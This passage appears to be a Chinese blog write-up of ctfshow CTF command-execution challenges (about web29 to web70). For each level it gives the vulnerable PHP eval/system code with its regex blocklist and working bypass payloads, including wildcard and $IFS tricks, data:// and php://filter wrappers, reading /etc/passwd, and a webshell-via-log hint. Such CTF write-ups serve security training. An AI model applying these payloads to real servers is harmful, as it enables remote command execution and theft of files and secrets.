class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/flag/i"</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单过滤了flag,用通配符即可绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=system(<span class="string">"ls"</span>);</span><br><span class="line">c=system(<span class="string">'cat f*'</span>);</span><br></pre></td></tr></table></figure><p>下面的题目都只放核心部分</p><h3 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/flag|system|php/i"</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以发现这里过滤了php和system,影响不大，system的替代函数有很多，像是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">shell_exec()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br><span class="line">pcntl_exec()</span><br><span class="line">exec()</span><br><span class="line"><span class="comment">#这里要注意除了system都是不会给出回显的，要用诸如echo,print_r等来带出结果</span></span><br></pre></td></tr></table></figure><p>不查看目录结构直接盲猜文件位置也是可以的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=<span class="keyword">echo</span> exec(<span class="string">'find / -name f*'</span>);</span><br><span class="line">c=<span class="keyword">echo</span> exec(<span class="string">'cat f*'</span>);</span><br></pre></td></tr></table></figure><h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/flag|system|php|cat|sort|shell|\.| |\'/i"</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>新加了几个过滤，cat,sort,shell,空格等，还是很好绕过的，上面的知识总结里有，这里就不赘述了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=<span class="keyword">echo</span>(`ls`);</span><br><span class="line">c=<span class="keyword">echo</span>(`c\at%<span class="number">09</span>f*`);</span><br></pre></td></tr></table></figure><h3 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i"</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这题过滤的东西变多了，单引号，分号，打印echo等都被过滤了</p><p>这里可以尝试包含</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=<span class="keyword">include</span><span class="string">"/etc/passwd"</span><span class="meta">?&gt;</span></span><br><span class="line">可以成功执行，考虑写入小🐎</span><br><span class="line">c=<span class="keyword">include</span><span class="string">"$_POST[1]"</span><span class="meta">?&gt;</span></span><br><span class="line">POST:<span class="number">1</span>=/etc/passwd</span><br><span class="line">最后可以用伪协议</span><br><span class="line">c=<span class="keyword">include</span><span class="string">"$_POST[1]"</span><span class="meta">?&gt;</span></span><br><span class="line">POST:php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure><h3 id="web33-35-payload同web32，过滤基本相同"><a href="#web33-35-payload同web32，过滤基本相同" class="headerlink" title="web33-35(payload同web32，过滤基本相同)"></a>web33-35(payload同web32，过滤基本相同)</h3><h3 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h3><p>多过滤了数字，post传递的参数换成字母即可</p><h3 id="web37-同39"><a href="#web37-同39" class="headerlink" title="web37(同39)"></a>web37(同39)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/flag/i"</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">include</span>($c);</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>换了形式的代码，这里会对输入进行包含，这里第一反应就是写入小马，也就是利用一句话</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#paylaod</span></span><br><span class="line">c=data:text/plain,<span class="meta">&lt;?php</span> system(<span class="string">'ls'</span>)<span class="meta">?&gt;</span></span><br><span class="line">c=data:text/plain,<span class="meta">&lt;?php</span> system(<span class="string">'cat f*'</span>)<span class="meta">?&gt;</span></span><br><span class="line">相当于执行了php语句<span class="meta">&lt;?php</span> system(<span class="string">'cat f*'</span>)<span class="meta">?&gt;</span>.php</span><br><span class="line">因为前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上</span><br></pre></td></tr></table></figure><h3 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/flag|php|file/i"</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">include</span>($c);</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里还是能够用data伪协议绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=data:text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span><br></pre></td></tr></table></figure><p>还可以在UA写入一句话，包含日志文件</p><h3 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\'|\"|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i"</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>除了字母，一些特殊字符基本都被过滤了</p><p>这道题和GXY禁止套娃解法相同，利用特殊的函数进行绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#</span></span><br><span class="line">c=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br><span class="line">具体函数功能看最前部分</span><br></pre></td></tr></table></figure><h3 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">'c'</span>];</span><br><span class="line">    system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里涉及到linux命令中的分隔符，前面总结中有</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=ls;</span><br><span class="line">c=cat flag.php;||c=cat f*;</span><br></pre></td></tr></table></figure><h3 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>过滤了分隔符引号和文本读取cat</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=ls||</span><br><span class="line">c=c\at f*||</span><br></pre></td></tr></table></figure><h3 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/;|cat|flag/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>多过滤了flag，通配符即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=ls||</span><br><span class="line">c=c\at f*||</span><br></pre></td></tr></table></figure><h3 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| /i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>多了个空格被过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=c\at%<span class="number">09</span>f*||</span><br></pre></td></tr></table></figure><h3 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\\$|\*/i"</span>, $c))&#123;</span><br><span class="line">    system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>增加数字过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=c\at&lt;&gt;f%<span class="number">27</span>%<span class="number">27</span>lag.php||</span><br><span class="line">c=nl&lt;fl<span class="string">''</span>ag.php||</span><br></pre></td></tr></table></figure><h3 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>上题的payload能打通</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=c\at&lt;&gt;f%<span class="number">27</span>%<span class="number">27</span>lag.php||</span><br></pre></td></tr></table></figure><h3 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>同上题payload，增加的过滤无影响</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=c\at&lt;&gt;f%<span class="number">27</span>%<span class="number">27</span>lag.php||</span><br></pre></td></tr></table></figure><h3 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>多过滤了百分号，同上题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=c\at&lt;&gt;f%<span class="number">27</span>%<span class="number">27</span>lag.php||</span><br></pre></td></tr></table></figure><h3 id="web50-51"><a href="#web50-51" class="headerlink" title="web50-51"></a>web50-51</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>增加十六进制对制表符等的过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=c\at&lt;&gt;f%<span class="number">27</span>%<span class="number">27</span>lag.php||</span><br></pre></td></tr></table></figure><h3 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>过滤了尖括号，空格换种方式绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=c\at$IFS/fl%<span class="number">27</span>%<span class="number">27</span>ag||</span><br></pre></td></tr></table></figure><h3 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">echo</span>($c);</span><br><span class="line">        $d = system($c);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>.$d;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>改变了形式，不再需要命令分隔符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=c\at$&#123;IFS&#125;fl%<span class="number">27</span>%<span class="number">27</span>ag.php</span><br></pre></td></tr></table></figure><h3 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span>, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里过滤很严格，但是依旧可以绕过，用通配符和bash</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=/bin/?at$&#123;IFS&#125;f???????</span><br></pre></td></tr></table></figure><h3 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span>, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[@-[]是linux下的匹配符，是进行匹配的大写字母</span><br></pre></td></tr></table></figure><p>起一个文件上传的网页，上传文件抓个包，具体知识点看截图</p><img src="/2020/09/22/ctfshowcommand/1.png" class=""><h3 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\'|\"|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span>, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>解法跟55同</p><h3 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i"</span>, $c))&#123;</span><br><span class="line">        system(<span class="string">"cat "</span>.$c.<span class="string">".php"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>根据提示flag在36.php文件中，无字母数字构造出36</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line"><span class="comment">#$((~$(()))) -1</span></span><br><span class="line"><span class="comment">#$((~$(($((~$(())))$((~$(()))))))) 1</span></span><br><span class="line"><span class="comment">#$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span></span><br></pre></td></tr></table></figure><h3 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'c'</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">'c'</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过测试，发现命令执行函数基本上都被ban了，这里要寻找其他方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=show_source(<span class="string">"flag.php"</span>);</span><br><span class="line">c=highlight_file(<span class="string">"flag.php"</span>);</span><br><span class="line">其他师傅的姿势</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">"flag.php"</span>);          </span><br><span class="line">readfile(<span class="string">"flag.php"</span>);</span><br></pre></td></tr></table></figure><h3 id="web59-web65"><a href="#web59-web65" class="headerlink" title="web59-web65"></a>web59-web65</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=highlight_file(<span class="string">"flag.php"</span>);<span class="comment">#通杀</span></span><br><span class="line">c=show_source(<span class="string">"flag.php"</span>);<span class="comment">#通杀</span></span><br><span class="line">下面的payload来自_yu_师傅（感谢）</span><br><span class="line">通过fopen读文件内容：</span><br><span class="line">函数：</span><br><span class="line">fread()</span><br><span class="line">fgets()</span><br><span class="line">fgetc()</span><br><span class="line">fgetss()</span><br><span class="line">fgetcsv()</span><br><span class="line">gpassthru()</span><br><span class="line">$a=fopen(<span class="string">"flag.php"</span>,<span class="string">"r"</span>);<span class="keyword">while</span> (!feof($a)) &#123;$line = fgetss($a);<span class="keyword">echo</span> $line;&#125;       <span class="comment">//php7.3版本后 该函数已不再被使用</span></span><br><span class="line">$a=fopen(<span class="string">"flag.php"</span>,<span class="string">"r"</span>);<span class="keyword">echo</span> fpassthru($a);                                      <span class="comment">//过59</span></span><br><span class="line">$a=fopen(<span class="string">"flag.php"</span>,<span class="string">"r"</span>);<span class="keyword">echo</span> fread($a,<span class="string">"1000"</span>);                                   <span class="comment">//过59</span></span><br><span class="line">$a=fopen(<span class="string">"flag.php"</span>,<span class="string">"r"</span>);<span class="keyword">while</span> (!feof($a)) &#123;$line = fgets($a);<span class="keyword">echo</span> $line;&#125;        <span class="comment">//过59</span></span><br><span class="line">$a=fopen(<span class="string">"flag.php"</span>,<span class="string">"r"</span>);<span class="keyword">while</span> (!feof($a)) &#123;$line = fgetc($a);<span class="keyword">echo</span> $line;&#125;        <span class="comment">//过60</span></span><br><span class="line">$a=fopen(<span class="string">"flag.php"</span>,<span class="string">"r"</span>);<span class="keyword">while</span> (!feof($a)) &#123;$line = fgetcsv($a);print_r($line);&#125;  <span class="comment">//过60</span></span><br><span class="line">单一函数读文件内容：</span><br><span class="line">函数：</span><br><span class="line">file_get_contents()</span><br><span class="line">readfile()</span><br><span class="line">file()</span><br><span class="line">用法：</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">"flag.php"</span>);           <span class="comment">//过58</span></span><br><span class="line">readfile(<span class="string">"flag.php"</span>);                         <span class="comment">//过58</span></span><br><span class="line">print_r(file(<span class="string">"flag.php"</span>));                    <span class="comment">//过59</span></span><br><span class="line">通过复制，重命名读取php文件内容（函数执行后，访问url/flag.txt）</span><br><span class="line">函数：</span><br><span class="line">copy()</span><br><span class="line">rename()</span><br><span class="line">用法：</span><br><span class="line">copy(<span class="string">"flag.php"</span>,<span class="string">"flag.txt"</span>);             <span class="comment">//过60</span></span><br><span class="line">rename(<span class="string">"flag.php"</span>,<span class="string">"flag.txt"</span>);           <span class="comment">//过60</span></span><br></pre></td></tr></table></figure><h3 id="web66-web70"><a href="#web66-web70" class="headerlink" title="web66-web70"></a>web66-web70</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'c'</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">'c'</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>核心代码部分没有改变，变得是文件位置，需要对目录结构进行扫描</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=var_dump(scandir(<span class="string">"/"</span>));highlight_file(<span class="string">"/flag.txt"</span>);</span><br><span class="line">c=var_dump(scandir(<span class="string">"/"</span>));<span class="keyword">include</span>(<span class="string">"/flag.txt"</span>);</span><br><span class="line"><span class="comment">#由于后面的文件都是txt文件，所以可以直接用include进行包含</span></span><br><span class="line"></span><br><span class="line">c=var_dump(scandir(<span class="string">"/"</span>));highlight_file(<span class="string">"/flag.txt"</span>);          <span class="comment">//过66-67                              </span></span><br><span class="line">c=$a=opendir(<span class="string">"/"</span>); <span class="keyword">while</span> (($file = readdir($a)) !== <span class="keyword">false</span>)&#123;<span class="keyword">echo</span> $file . <span class="string">"&lt;br&gt;"</span>; &#125;;highlight_file(<span class="string">"/flag.txt"</span>);                       <span class="comment">//过66-67</span></span><br></pre></td></tr></table></figure><h3 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 